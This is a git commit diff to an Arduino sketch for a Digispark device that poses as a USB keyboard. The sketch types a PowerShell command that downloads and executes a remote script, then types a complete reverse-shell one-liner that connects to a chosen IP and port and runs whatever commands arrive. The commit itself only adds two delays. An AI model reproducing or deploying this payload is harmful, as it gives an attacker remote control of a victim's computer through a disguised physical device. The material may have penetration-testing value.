af20ad0886edfd1f473c961e2fe8f2b026f20667
Michael Astfalk <93363006+calicojack1720@users.noreply.github.com>
2024-05-30 11:27:22 -0400

    Update reverseDucky.ino

--- ducky/reverseDucky/reverseDucky.ino
+++ ducky/reverseDucky/reverseDucky.ino
@@ -13,9 +13,11 @@ void loop() {
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(500);
   DigiKeyboard.print("powershell \"IEX (New-Object Net.WebClient).DownloadString('https://10.2.172.68/kali/home/Downloads/Invoke-PowerShellTcpOneLine.ps1');\"");
+  DigiKeyboard.delay(500);
   
   //change the IP address and the port number to the desired IP and port on the next line
   DigiKeyboard.print("$client = New-Object System.Net.Sockets.TCPClient('127.0.0.1',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex \". { $data } 2>&1\" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()");
+  DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   for (;;) {
     /*Stops the digispark from running the scipt again*/
